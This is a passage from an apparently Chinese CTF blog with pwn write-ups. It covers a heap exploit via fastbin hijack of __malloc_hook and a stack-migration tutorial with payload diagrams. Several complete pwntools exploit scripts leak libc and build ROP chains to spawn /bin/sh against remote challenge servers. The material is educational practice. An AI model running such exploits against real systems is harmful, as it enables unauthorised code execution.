class="hljs-string">b&#x27;\x00&#x27;</span>))<br>get_q = <span class="hljs-keyword">lambda</span> data: (~np.uint64(data) + <span class="hljs-number">1</span>)<br>get_d = <span class="hljs-keyword">lambda</span> data: (~np.uint32(data) + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sh</span>() : <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">&#x27;==&gt;&#x27;</span> +<span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>itr    = <span class="hljs-keyword">lambda</span>                    :io.interactive()<br><br>io = remote(<span class="hljs-string">&#x27;121.41.16.43&#x27;</span>,<span class="hljs-number">50604</span>)<br><span class="hljs-comment">#io = process(&#x27;./babyheap&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">men</span>(<span class="hljs-params">i</span>):<br>    ru(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(i))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    men(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27;want&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    ru(<span class="hljs-string">&#x27;something&#x27;</span>)<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">i,content</span>):<br>    men(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;index&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(i))<br>    ru(<span class="hljs-string">&#x27;something&#x27;</span>)<br>    s(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">i</span>):<br>    men(<span class="hljs-number">3</span>)<br>    ru(<span class="hljs-string">&#x27;index&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(i))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">i</span>):<br>    men(<span class="hljs-number">4</span>)<br>    ru(<span class="hljs-string">&#x27;index&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x1f0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x200</span>,b’aaaa’)<br>list1=<span class="hljs-number">0x6020C0</span><br><br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x230</span>))<br><span class="hljs-comment">#pause()</span><br><br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment"># chunk_1未被dele但是被consolidate合并入unsortedbins,old_chunk_2的 pre_size = old_chunk_0 + old_chunk_1，且size的pre_use置为了零</span><br><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)   <span class="hljs-comment"># chunk_0</span><br><span class="hljs-comment">#pause()</span><br><br>show(<span class="hljs-number">1</span>)      <br><span class="hljs-comment"># chunk_1未被dele但是被consolidate合并入unsortedbins,用于泄露libc</span><br><br>ru(<span class="hljs-string">&#x27;see see\n&#x27;</span>)<br>libc_base=uu64(r(<span class="hljs-number">6</span>))-<span class="hljs-number">0x3c4b78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#chunk_2</span><br><span class="hljs-comment">#pause()</span><br><br>free_hook=libc_base+<span class="hljs-number">0x3c67a8</span><br>malloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># chunk_2放入fastbins</span><br><span class="hljs-comment">#pause()</span><br><br>edit(<span class="hljs-number">1</span>,p64(malloc-<span class="hljs-number">0x20</span>-<span class="hljs-number">3</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment"># fastbin--&gt;fd_hijack</span><br><br>sys=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>onegadget=[<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>add(<span class="hljs-number">0x60</span>,p64(sys))<br><span class="hljs-comment">#pause()</span><br><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>+p64(<span class="hljs-number">0</span>)+p64(onegadget[<span class="hljs-number">0</span>]+libc_base)+p64(realloc+<span class="hljs-number">0x8</span>))<br><span class="hljs-comment">#pause()</span><br><br>io.interactive()<br><span class="hljs-comment"># flag&#123;7421793d-f868de57-90556d34-2e000b1e&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>&lt;span class=&quot;label label-primary&quot;&gt;PWN&lt;/span&gt;</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stack_migrantion</title>
    <link href="/2024/11/28/Stack_migrantion/"/>
    <url>/2024/11/28/Stack_migrantion/</url>
    
    <content type="html"><![CDATA[<h1 id="OOFnK">一. 漏洞原理</h1><h1 id="okw1B">二. 漏洞利用</h1><h2 id="CQO3O">任意地址写</h2>> 情况1：存在**<font style="color:#DF2A3F;">多次输入</font>**和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。><p>第一次溢出<strong>覆盖栈底 rbp &#x2F; ebp</strong>，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp 为 address[password] + 4 ），根据第二次输入选择合适地址能够覆盖该值。</p><h2 id="oop1x">i386+ret2libc3</h2>> size( buffer ) = 0x2c，read（0，&(rbp-0x2c)，0x34)    【溢出覆盖 ebp , ebp+0x4】>> 注意点：read 代码段末尾自带  leave ; ret>> leave = mov ebp , esp   +   pop ebp         [ 随后 esp+0x4]>> ret = pop rsp                                            [ 随后 esp+0x4]><h3 id="yUsYO">payload 结构图</h3>| payload_1 | payload2 | payload3 || --- | --- | --- || buf_start<font style="color:#2F4BDA;">   </font><font style="color:#D22D8D;"> aaaa</font> | <font style="color:#DF2A3F;">      bss+0x800</font><br>[利用后面的 leave ; ret<br> 为payload3准备ebp】 | <font style="color:#601BDE;">aaaa</font> || <font style="color:#D22D8D;">...</font> | <font style="color:#DF2A3F;">puts_plt</font> | <font style="color:#601BDE;">system</font> || <font style="color:#D22D8D;">...</font> | <font style="color:#DF2A3F;">      read</font>【puts 调用后返回地址】 | <font style="color:#601BDE;">0</font> || <font style="color:#D22D8D;">...</font> | <font style="color:#DF2A3F;">puts_got   </font>【puts 参数】 | <font style="color:#601BDE;">/bin/sh</font> || buf_end  <font style="color:#2F4BDA;">  </font><font style="color:#D22D8D;">aaaa</font> | aaaa...... | <font style="color:#601BDE;">aaaa......</font> || <font style="color:#2F4BDA;">ebp        </font><font style="color:#D22D8D;">  bss+0x2c</font> | <font style="color:#DF2A3F;">bss </font> | <font style="color:#601BDE;">bss+0x800-0x2c</font> || <font style="color:#2F4BDA;">"eip"        </font><font style="color:#D22D8D;"> leave ; ret</font> | <font style="color:#DF2A3F;">leave ; ret</font> | <font style="color:#601BDE;">leave</font> |<h3 id="Mzu6V">exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">offset = 0x2c<br><br>bss = 0x804c000-0x900<br>puts_plt = 0x8048510           <span class="hljs-comment">#elf.plt[&#x27;puts&#x27;]</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>ebp = 0x804897b<br><span class="hljs-built_in">read</span> = 0x08048829<br>leave = 0x08048605<br><br>payload1 = b<span class="hljs-string">&#x27;a&#x27;</span>*offset  + p32(bss+0x2c) + p32(<span class="hljs-built_in">read</span>)<br>io.send(payload1)<br><br>p2 = p32(bss+0x800)  + p32(puts_plt) + p32(<span class="hljs-built_in">read</span>) + p32(puts_got) <br>payload2 = p2.ljust(offset,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p32(bss) + p32(leave)<br>io.send(payload2)<br><br>puts  = u32(r.recvuntil(b<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-4:])<br><span class="hljs-built_in">print</span>(hex(puts))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts)<br>libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br><span class="hljs-built_in">print</span>(hex(libc_base))<br>sym = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>p3 =b<span class="hljs-string">&#x27;a&#x27;</span>*4 + p32(sym) + p32(0) + p32(binsh_addr)<br>payload3 =p3.ljust(offset, b<span class="hljs-string">&#x27;\x00&#x27;</span>) +p32(bss +0x800 -0x2c) +p32(leave)<br>r.send(payload3)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="F3tSe">三. 例题</h1><h2 id="Nds5s">溢出4/8字节</h2><h3 id="Polb6">栈地址可知</h3><h3 id="RewXT">栈地址未知</h3><h2 id="r7sOB">溢出8/16字节</h2><h3 id="XTGAk">栈地址可知</h3>> 如果可以获取输入地点的栈地址，或者bss段/堆空间 找不到合适空间，并且输入点长度足够构造ROP链，可以直接在输入点进行二次栈迁移。><blockquote><p>通常可以获取栈地址的方法：</p><ol><li><strong>程序直接给出。</strong></li><li><strong>通过printf，puts 等函数泄露。</strong>（注意：**<font style="color:#DF2A3F;">printf函数通过%s泄露的是  某地址 存储的 </font><strong><strong>数据</strong></strong><font style="color:#DF2A3F;">而不是实际地址，</font>**<strong>puts函数与之效果相同</strong>）（可参见例题2，ebp-0x40而不是ebp-0x30）。</li></ol></blockquote><h4 id="JBJza"><font style="color:rgb(33, 37, 41);">stack migration</font></h4>> 题源：BUUCTF-PWN（<font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道]</font>）><p><strong><font style="color:#DF2A3F;">方法1：栈迁移+ret2libc3</font></strong></p><h5 id="Ro65Z">源码</h5>![](Stack_migration/1.png)![](./test/image.png)<h5 id="WPQdj">栈帧结构</h5>payload'2'为参考exp构造，[详见](https://blog.csdn.net/Xzzzz911/article/details/133842017)。官方wp同payload2。<table><thead><tr><th><font style="color:#117CEE;">payload 1</font></th><th></th><th></th><th></th><th><font style="color:#117CEE;">payload 2</font></th><th><font style="color:#117CEE;">payload ‘2’</font></th></tr></thead><tbody><tr><td><font style="color:#5C8D07;">aaaaaaaa</font></td><td>buf 1****</td><td>:::color5 <strong><font style="color:#DF2A3F;">&lt;—-stack—&gt;</font></strong><br>:::</td><td>buf 1</td><td><font style="color:#5C8D07;">aaaaaaaa</font></td><td><font style="color:#5C8D07;">aaaaaaaa</font></td></tr><tr><td>aaaaaaaa</td><td>buf 2</td><td></td><td>buf 2</td><td><font style="color:#601BDE;">pop rdi；ret</font></td><td><strong>bbbbbbbb</strong></td></tr><tr><td><font style="color:#601BDE;">pop rdi；ret</font></td><td></td><td></td><td></td><td><font style="color:#601BDE;">      bin</font></td><td>**      ret**</td></tr><tr><td><font style="color:#601BDE;">    got</font></td><td></td><td></td><td></td><td><font style="color:#601BDE;">      sys</font></td><td><font style="color:#601BDE;"> pop rdi；ret</font></td></tr><tr><td><font style="color:#601BDE;">    plt</font></td><td></td><td></td><td></td><td>aaaaaaaa</td><td><font style="color:#601BDE;">      bin</font></td></tr><tr><td><font style="color:#601BDE;">   main</font></td><td></td><td></td><td></td><td>aaaaaaaa</td><td><font style="color:#601BDE;">      sys</font></td></tr><tr><td>aaa……</td><td></td><td></td><td></td><td>aaa…….</td><td>aaa……</td></tr><tr><td>** fake_rbp**</td><td><strong>（stack）</strong></td><td>:::color5 <strong><font style="color:#DF2A3F;">&lt;——-rbp—&gt;</font></strong><br>:::</td><td></td><td>**  **** stack**</td><td>**    stack+8**</td></tr><tr><td>** leave；ret**</td><td></td><td></td><td></td><td>**   leave；ret**</td><td>**   leave；ret**</td></tr></tbody></table><h5 id="Q1XAX">栈迁移运行流程</h5>> 与本题不太一样，payload1中buf2处填充8字节数据平衡栈帧，否则接收不到再次进入main时候的栈地址。><p>一. 栈迁移调用 puts函数 泄露puts真实地址</p><p><img src="https://cdn.nlark.com/yuque/0/2024/gif/34628707/1706536374323-a5cd75a5-fb32-4097-9da6-de7b0dad8171.gif"></p><p>二. 返回到main函数后第二次栈迁移获取shell</p><p>（1）函数内部结尾的 **<font style="color:#DF2A3F;">leave结束后</font>**栈结构：</p><table><thead><tr><th>stack</th><th><font style="color:#5C8D07;">aaaaaaaa</font></th><th>buf 1</th><th><font style="color:#5C8D07;">aaaaaaaa</font></th><th><strong><font style="color:#DF2A3F;">&lt;—rbp</font></strong></th></tr></thead><tbody><tr><td></td><td><font style="color:#601BDE;">pop rdi；ret</font></td><td>buf 2</td><td><font style="color:#601BDE;">pop rdi；ret</font></td><td></td></tr><tr><td></td><td><font style="color:#601BDE;">      bin</font></td><td></td><td><font style="color:#601BDE;">      bin</font></td><td></td></tr><tr><td></td><td><font style="color:#601BDE;">      sys</font></td><td></td><td><font style="color:#601BDE;">      sys</font></td><td></td></tr><tr><td></td><td>aaaaaaaa</td><td></td><td>aaaaaaaa</td><td></td></tr><tr><td></td><td>aaaaaaaa</td><td></td><td>aaaaaaaa</td><td></td></tr><tr><td></td><td>aaa…….</td><td></td><td>aaa…….</td><td></td></tr><tr><td><strong><font style="color:#DF2A3F;">rbp,rsp–&gt;</font></strong></td><td>**  **** stack**</td><td><strong><font style="color:#DF2A3F;"></font></strong></td><td>**  **** stack**</td><td><strong><font style="color:#DF2A3F;"></font></strong></td></tr><tr><td></td><td>**   leave；ret**</td><td></td><td>**   leave；ret**</td><td><strong><font style="color:#DF2A3F;">&lt;—rsp</font></strong></td></tr></tbody></table><p><strong>ret结束</strong>后， <strong>rip</strong> 指向 **   leave；ret **地址，rsp比原来向下移动 4&#x2F;8字节。</p><p>（2）**<font style="color:#DF2A3F;">rip执行leave后</font>**：</p><p>此时rbp内部完全是数据（aaaaaaaa）</p><table><thead><tr><th></th><th><font style="color:#117CEE;">payload 2</font></th><th></th></tr></thead><tbody><tr><td>buf 1</td><td><font style="color:#5C8D07;">aaaaaaaa</font></td><td></td></tr><tr><td>buf 2</td><td><font style="color:#601BDE;">pop rdi；ret</font></td><td><strong><font style="color:#DF2A3F;">&lt;—rsp</font></strong></td></tr><tr><td></td><td><font style="color:#601BDE;">      bin</font></td><td></td></tr><tr><td></td><td><font style="color:#601BDE;">      sys</font></td><td></td></tr><tr><td></td><td>aaaaaaaa</td><td></td></tr><tr><td></td><td>aaaaaaaa</td><td></td></tr><tr><td></td><td>aaa…….</td><td></td></tr><tr><td></td><td>**  **** stack**</td><td></td></tr><tr><td></td><td>**   leave；ret**</td><td></td></tr></tbody></table><p>**<font style="color:#DF2A3F;">rip执行ret之后</font>**：</p><p><strong>rsp—&gt;&#x2F;bin&#x2F;sh</strong></p><p>rip—-&gt;pop rdi；ret</p><p>（3）**<font style="color:#DF2A3F;">rip执行pop rdi后：</font>**</p><p>rdi—&gt;&#x2F;bin&#x2F;sh</p><p>rsp—&gt;system</p><p>rip—&gt;ret</p><p><strong><font style="color:#DF2A3F;">rip执行ret指令：</font></strong></p><p>rip—&gt;system（system_plt）</p><p>rsp—&gt;aaaaaa</p><p><strong>接着会调用system函数，同时rdi的数据&#x2F;bin&#x2F;sh成为参数，执行了shell。</strong></p><h5 id="Ke3s7">exp示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io = process(&#x27;./pwn2&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28894</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x4012ac</span><br>ret  = <span class="hljs-number">0x40101a</span><br>leave = <span class="hljs-number">0x4012aa</span><br>pop_rdi =  <span class="hljs-number">0x401333</span><br>offset = <span class="hljs-number">0x50</span><br><br>io.sendafter(<span class="hljs-string">b&#x27;name:\n&#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>) <span class="hljs-comment">#p64(pop_rdi)</span><br><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-comment">#=堆栈平衡，令ROP向下挪移8字节（p64(0)，stack+8），否则第二次接受不到栈地址0x...=</span><br><span class="hljs-comment">#泄漏stack为第一个buf地址（第一次读入八字节的地址）</span><br>p1 = (p64(<span class="hljs-number">0</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)).ljust(offset,<span class="hljs-string">b&#x27;a&#x27;</span>) <br>p1 += p64(stack+<span class="hljs-number">8</span>) + p64(leave)<br><span class="hljs-comment">#======================================================================</span><br>io.sendafter(<span class="hljs-string">b&#x27;plz:\n&#x27;</span>,p1)<br>io.recvuntil(<span class="hljs-string">b&quot;maybe I&#x27;ll see you soon!\n&quot;</span>)<br>puts =u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base = puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">bin</span> = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>io.sendafter(<span class="hljs-string">b&#x27;name:\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-comment">#===============此处直接填充亦可==========================</span><br>p2 = (p64(pop_rdi) + p64(<span class="hljs-built_in">bin</span>) + p64(sys)).ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p2 += p64(stack) +p64(leave)<br><span class="hljs-comment">#========================================================</span><br>io.sendafter(<span class="hljs-string">b&#x27;plz:\n&#x27;</span>,p2)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><strong><font style="color:#DF2A3F;"></font></strong></p><p><strong><font style="color:#DF2A3F;">方法2：leak_libc_base+栈迁移</font></strong></p><blockquote><p><font style="color:#DF2A3F;">主要思路：</font><font style="color:#117CEE;">由于</font><strong><font style="color:#117CEE;">printf以%s打印数据时候遇到 b’\x00’ 才会停止</font></strong><font style="color:#117CEE;">。输入满8字节，利用</font><strong>printf函数可以直接打印出函数 _IO_file_jumps 地址</strong><font style="color:#117CEE;">，</font><strong>利用给出的 libc程序进而获取 libc_base 地址</strong><font style="color:#117CEE;">， 然后直接得到system和&#x2F;bin&#x2F;sh地址，只进行一次栈迁移（payload2）即可获取shell。</font></p></blockquote><p>tips：有个疑点，如下图。<strong>kali与Xubuntu下gdb调试的栈帧结构出现了不一致</strong>……</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706613471638-30dcb5b4-654c-495e-b8e2-9425aaf60ee7.png"></p><blockquote><p>kali下_IO_file_jumps函数在打印地址上方，但实际上应该在下面。所以才会带出_IO_file_jumps函数地址。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706613479807-766b01bb-ceea-447f-b838-add0788621ca.png"></p><blockquote><p><strong><font style="color:#DF2A3F;">Xubuntu下gdb调试结构：（与靶机实际栈结构一致）</font></strong></p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706614846465-7cb1bea0-bca5-4636-b1aa-4104471e45d2.png"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>io = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">27066</span>)<br><br>main = <span class="hljs-number">0x4012ac</span><br>ret  = <span class="hljs-number">0x40101a</span><br>leave = <span class="hljs-number">0x4012aa</span><br>pop_rdi =  <span class="hljs-number">0x401333</span><br>offset = <span class="hljs-number">0x50</span><br><span class="hljs-comment"># 第一次发送数据利用printf函数泄露一个函数地址</span><br>io.sendafter(<span class="hljs-string">b&#x27;name:\n&#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>) <br>_IO_file_jumps =u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(_IO_file_jumps))<br><span class="hljs-comment"># 获得栈地址</span><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>,_IO_file_jumps)<br>libc_base = _IO_file_jumps-libc.dump(<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>)<br>sys = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">bin</span> = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>p2 = (p64(pop_rdi) + p64(<span class="hljs-built_in">bin</span>) + p64(sys)).ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p2 += p64(stack) +p64(leave)<br><br>io.sendafter(<span class="hljs-string">b&#x27;plz:\n&#x27;</span>,p2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="euX4P"><font style="color:rgba(0, 0, 0, 0.85);">八字节能干什么</font></h4>> 题源：PolarD&N-PWN><h5 id="twBtO">源码</h5>首先有两次输入机会，并且 ebp 和 ebp+4 可以控制。给出了system('ls')；可以调用system函数。<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706625334763-bf872cff-e026-4fa9-b915-e24b5046a73b.png"></p><h5 id="ANb77">分析</h5>第一次输入填充垃圾数据，利用printf函数泄露 ebp 的内容，然后 减去 偏移得到栈地址。<p>第二次构造ROP链，利用read向栈读入 &#x2F;bin&#x2F;sh\x00 参数 构造 system(‘&#x2F;bin&#x2F;sh’)后面函数。ebp填充栈地址，然后填充leave；ret 进行栈迁移，使得程序再次从栈地址运行，获取shell。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706625502204-84a14677-bbf1-4fe2-9df4-07ec66686f95.png"></p><h5 id="PAL2Z">exp：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = remote(<span class="hljs-string">&#x27;120.46.59.242&#x27;</span>,<span class="hljs-number">2109</span>)<br><span class="hljs-comment">#io = process(&#x27;./1&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br><br>io.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br><br>ebp_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>stack = ebp_addr-<span class="hljs-number">0x40</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>leave = <span class="hljs-number">0x8048488</span><br>sys = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p1 = (<span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(sys) + p32(<span class="hljs-number">1</span>) + p32(stack+<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;/bin/sh&#x27;</span> ).ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span 